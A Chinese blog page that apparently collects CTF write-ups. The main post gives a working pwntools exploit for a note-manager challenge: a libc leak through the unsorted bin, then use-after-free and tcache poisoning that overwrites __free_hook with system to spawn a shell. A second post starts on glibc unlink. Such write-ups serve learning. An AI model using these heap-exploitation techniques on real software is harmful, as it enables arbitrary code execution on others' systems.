<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 7.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">

<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Noto Sans Simplified Chinese:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"rjcnb666.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false,"announcement":{"enable":true}},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":"enable","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
<style>
    .pace .pace-progress {
        background: #1E92FB; /*è¿›åº¦æ¡é¢œè‰²*/
        height: 3px;
    }
    .pace .pace-progress-inner {
         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*é˜´å½±é¢œè‰²*/
    }
    .pace .pace-activity {
        border-top-color: #1E92FB;    /*ä¸Šè¾¹æ¡†é¢œè‰²*/
        border-left-color: #1E92FB;    /*å·¦è¾¹æ¡†é¢œè‰²*/
    }
</style>


  <meta name="description" content="Ê•Â´â€¢á´¥â€¢Â Ê”">
<meta property="og:type" content="website">
<meta property="og:title" content="mvegetable&#39;blog">
<meta property="og:url" content="https://rjcnb666.github.io/index.html">
<meta property="og:site_name" content="mvegetable&#39;blog">
<meta property="og:description" content="Ê•Â´â€¢á´¥â€¢Â Ê”">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="JC">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://rjcnb666.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>mvegetable'blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="åˆ‡æ¢å¯¼èˆªæ ">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">mvegetable'blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">K-ON  Ê•Â·á´¥Â·Ê”à¸…</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>é¦–é¡µ</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>å…³äº</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>æ ‡ç­¾</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>åˆ†ç±»</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>å½’æ¡£</a>

  </li>
        <li class="menu-item menu-item-ret2me">

    <a href="/RET2ME/" rel="section"><i class="fa fa-book fa-fw"></i>RET2ME</a>

  </li>
        <li class="menu-item menu-item-null">

    <a href="/NULL/" rel="section"><i class="fa fa-skull fa-fw"></i>null</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>æœç´¢
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off"
           placeholder="æœç´¢..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://rjcnb666.github.io/2025/12/03/editable_note/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/tou.jpg">
      <meta itemprop="name" content="JC">
      <meta itemprop="description" content="Ê•Â´â€¢á´¥â€¢Â Ê”">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="mvegetable'blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/12/03/editable_note/" class="post-title-link" itemprop="url">editable_note</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2025-12-03 22:30:32 / ä¿®æ”¹æ—¶é—´ï¼š22:30:46" itemprop="dateCreated datePublished" datetime="2025-12-03T22:30:32+08:00">2025-12-03</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>2.5k</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="editable-note"><a href="#editable-note" class="headerlink" title="editable_note"></a>editable_note</h1><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203210748426.png" alt="image-20251203210748426"></p>
<p>è‰¾æˆ‘ä¹Ÿå–œæ¬¢æ”»ç ´é¶æœºçš„æ„Ÿè§‰ã€‚</p>
<h2 id="é¢˜ç›®ï¼š"><a href="#é¢˜ç›®ï¼š" class="headerlink" title="é¢˜ç›®ï¼š"></a>é¢˜ç›®ï¼š</h2><h3 id="menu"><a href="#menu" class="headerlink" title="menu:"></a>menu:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203210953023.png"></p>
<h3 id="add"><a href="#add" class="headerlink" title="add:"></a>add:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203211025974.png" alt="image-20251203211025974"></p>
<h3 id="delete"><a href="#delete" class="headerlink" title="delete:"></a>delete:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203211056868.png" alt="image-20251203211056868"></p>
<h3 id="edit"><a href="#edit" class="headerlink" title="edit:"></a>edit:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203211153251.png" alt="image-20251203211153251"></p>
<h3 id="show"><a href="#show" class="headerlink" title="show:"></a>show:</h3><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203211227251.png" alt="image-20251203211227251"></p>
<p><strong>è¿™ä¸ªé¢˜æ˜¯å…¸å‹çš„<code>uaf </code>+ <code>tache posioning</code></strong></p>
<h2 id="è§£é¢˜ï¼š"><a href="#è§£é¢˜ï¼š" class="headerlink" title="è§£é¢˜ï¼š"></a>è§£é¢˜ï¼š</h2><h3 id="æ³„éœ²libc"><a href="#æ³„éœ²libc" class="headerlink" title="æ³„éœ²libc:"></a>æ³„éœ²<code>libc</code>:</h3><p>é€šè¿‡<code>unsorted bin</code>æ³„éœ²<code>main_arena</code>è¿›è€Œæ³„éœ²<code>Libc</code></p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">p = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node5.anna.nssctf.cn&quot;,25397)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">leng,color</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(leng))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(color))</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">id1</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(id1))	</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">id1</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(id1))	</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">id1,name</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(id1))	</span><br><span class="line">	p.sendafter(<span class="string">&#x27;Content:&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x20</span>) // é˜²æ­¢äºtop chunkåˆå¹¶</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">main_arena=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">f&quot;main_arena: <span class="subst">&#123;<span class="built_in">hex</span>(main_arena)&#125;</span>&quot;</span>)</span><br><span class="line">libcbase = main_arena - <span class="number">0x1ecbe0</span></span><br><span class="line">log.success(<span class="string">f&quot;libcbase: <span class="subst">&#123;<span class="built_in">hex</span>(libcbase)&#125;</span>&quot;</span>)</span><br><span class="line">free_hook = libcbase + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">f&quot;libcbase: <span class="subst">&#123;<span class="built_in">hex</span>(system)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;libcbase: <span class="subst">&#123;<span class="built_in">hex</span>(free_hook)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>



<p>è¿™é‡Œå…ˆç”³è¯·8ä¸ªåŒæ ·å¤§å°çš„chunk ä¸ƒä¸ªç”¨æ¥å¡«æ»¡<code>tache bin</code>  å¦ä¸€ä¸ªç”¨æ¥é‡Šæ”¾è¿›å…¥<code>unsorted bin </code> </p>
<p>å¯ä»¥çœ‹åˆ°<code>chunk7</code> çš„fdå’Œbkéƒ½æŒ‡å‘<code>main_arena</code></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203212520431.png" alt="image-20251203212520431"></p>
<h4 id="ğŸ–ï¼š"><a href="#ğŸ–ï¼š" class="headerlink" title="ğŸ–ï¼š"></a>ğŸ–ï¼š</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">8</span>,<span class="number">0x20</span>) // é˜²æ­¢äºtop chunkåˆå¹¶</span><br></pre></td></tr></table></figure>

<p> æœ€å¼€å§‹åšçš„æ—¶å€™æ²¡æœ‰åŠ è¿™ä¸ª</p>
<p>å¯¼è‡´è¿™ä¸ªchunk é‡Šæ”¾åä¼šå’Œtop chunkåˆå¹¶ è€Œä¸æ˜¯è¿›å…¥unsorted bin::</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment">#add(8,0x20)</span></span><br><span class="line">dele(<span class="number">7</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203213410982.png" alt="image-20251203213410982"></p>
<p>å¯ä»¥çœ‹åˆ°æ²¡æœ‰è¿›å…¥ub ä¸”top chunkçš„åœ°å€å‘ç”Ÿäº†å˜åŒ–ã€‚</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203213429481.png" alt="image-20251203213429481"></p>
<h4 id="ğŸ–ï¼š-1"><a href="#ğŸ–ï¼š-1" class="headerlink" title="ğŸ–ï¼š"></a>ğŸ–ï¼š</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(i)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x20</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dele(<span class="number">8</span>) <span class="comment">###try</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¥½å¥‡å°è¯•äº†ä¸€ä¸‹é‡Šæ”¾è¿™ä¸ªchunk8 ä½†æ˜¯ä»–æ²¡æœ‰å’Œtop chunkåˆå¹¶ã€‚å› ä¸ºè¿›å…¥<code>tache </code>çš„ä¼˜å…ˆçº§é«˜äºtop chunk åˆå¹¶</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203213842185.png" alt="image-20251203213842185"></p>
<h3 id="uaf-posioning"><a href="#uaf-posioning" class="headerlink" title="uaf + posioning:"></a>uaf + <code>posioning</code>:</h3><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">9</span>,<span class="number">0x20</span>)  /// </span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x20</span>) ///</span><br><span class="line"></span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dele(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">9</span>,p64(free_hook))</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>æœ‰ç‚¹åƒdouble free</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203221329698.png" alt="image-20251203221329698"></p>
<p>è¿™é‡Œçš„<code>0x690</code>æ˜¯chunk9 <code>0x720</code>æ˜¯chunk8</p>
<p><code>tache</code>æ˜¯ LIFOï¼ˆåè¿›å…ˆå‡ºï¼‰</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203222111156.png" alt="image-20251203222111156"></p>
<p>chunk9ç›¸å½“äºå¤´æŒ‡é’ˆ chunk8æ˜¯å°¾æŒ‡é’ˆ</p>
<p>è¿™é‡Œä¿®æ”¹<code>chunk9</code>çš„nextæŒ‡é’ˆå°±å¯ä»¥åŠ«æŒ<code>tahce</code></p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203221237988.png" alt="image-20251203221237988"></p>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp:"></a>exp:</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">11</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x20</span>) // __free_hook</span><br><span class="line">edit(<span class="number">12</span>,p64(system))</span><br><span class="line">dele(<span class="number">10</span>) //è§¦å‘system(/<span class="built_in">bin</span>/sh)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>è¿™æ ·å°±æ‰“é€šäº†ã€‚</p>
<h4 id="ğŸ–ï¼š-2"><a href="#ğŸ–ï¼š-2" class="headerlink" title="ğŸ–ï¼š"></a>ğŸ–ï¼š</h4><p>åœ¨è°ƒè¯•çš„æ—¶å€™å‘ç°é‡æ–°ç”³è¯·chunkçš„æ—¶å€™ä¼šä¼˜å…ˆç”¨unsortedbinéƒ¨åˆ†çš„chunk</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">9</span>,<span class="number">0x20</span>)    ///<span class="number">1</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x20</span>)</span><br><span class="line">add(<span class="number">11</span>,<span class="number">0x20</span>)   ///<span class="number">2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x20</span>)   ///<span class="number">3</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x20</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åˆå§‹çŠ¶æ€ï¼š</p>
<p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203222607081.png" alt="image-20251203222607081"></p>
<h5 id="1"><a href="#1" class="headerlink" title="1:"></a>1:</h5><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203222709430.png" alt="image-20251203222709430"></p>
<h5 id="2"><a href="#2" class="headerlink" title="2:"></a>2:</h5><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203222723903.png" alt="image-20251203222723903"></p>
<p>å¯ä»¥çœ‹åˆ°<code>glibc</code>ä¼˜å…ˆåˆ†é…çš„æ˜¯<code>unsortedbin</code>ä¸­çš„chunk</p>
<h5 id="3"><a href="#3" class="headerlink" title="3:"></a>3:</h5><p><img src="https://jc-1333435582.cos.ap-chongqing.myqcloud.com/image/image-20251203222735752.png" alt="image-20251203222735752"></p>
<p><code>unsortedbin</code>åˆ†é…å®Œå ä¼šä»top chunkä¸­åˆ†å‰²ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://rjcnb666.github.io/2025/12/01/unlink/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/tou.jpg">
      <meta itemprop="name" content="JC">
      <meta itemprop="description" content="Ê•Â´â€¢á´¥â€¢Â Ê”">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="mvegetable'blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/12/01/unlink/" class="post-title-link" itemprop="url">unlink</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2025-12-01 22:39:44 / ä¿®æ”¹æ—¶é—´ï¼š23:05:42" itemprop="dateCreated datePublished" datetime="2025-12-01T22:39:44+08:00">2025-12-01</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">åˆ†ç±»äº</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="æœ¬æ–‡å­—æ•°">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">æœ¬æ–‡å­—æ•°ï¼š</span>
              <span>3.4k</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><h2 id="åŸç†ï¼š"><a href="#åŸç†ï¼š" class="headerlink" title="åŸç†ï¼š"></a>åŸç†ï¼š</h2><p>åœ¨æ‰§è¡Œ_int_free()å‡½æ•°çš„æ—¶å€™ä¼šæ‰§è¡Œunlink:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD)</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> _int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line"><span class="built_in">free</span>()&#123;</span><br><span class="line">	_int_free()&#123;</span><br><span class="line">		unlink();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>chunk1 freeè¿›å…¥unsortedbin çš„æ—¶å€™ï¼Œå¦‚æœç›¸é‚»åœ°å€çš„chunkçš„chunk2å¤„äºç©ºé—²çŠ¶æ€ï¼š</p>
<p><strong>unlinkä¼šå°†chunk1å’Œchunk2è¿›è¡Œåˆå¹¶æ“ä½œï¼Œè€Œchunk2çš„fdå’Œbkä½ç½®å¯¹åº”çš„åœ°å€å°±ä¼šè¿›è¡Œunlinkä¹Ÿå°±æ˜¯æ–­é“¾æ“ä½œã€‚</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"> <span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">         <span class="type">long</span> *hollk1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">         <span class="type">long</span> *first_chunk = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">         <span class="type">long</span> *hollk3 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">         <span class="type">long</span> *second_chunk = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">         <span class="type">long</span> *hollk5 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">         <span class="type">long</span> *third_chunk = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">         <span class="type">long</span> *hollk7 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line">         </span><br><span class="line">         <span class="built_in">free</span>(first_chunk);</span><br><span class="line">         <span class="built_in">free</span>(second_chunk);</span><br><span class="line">         <span class="built_in">free</span>(third_chunk);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

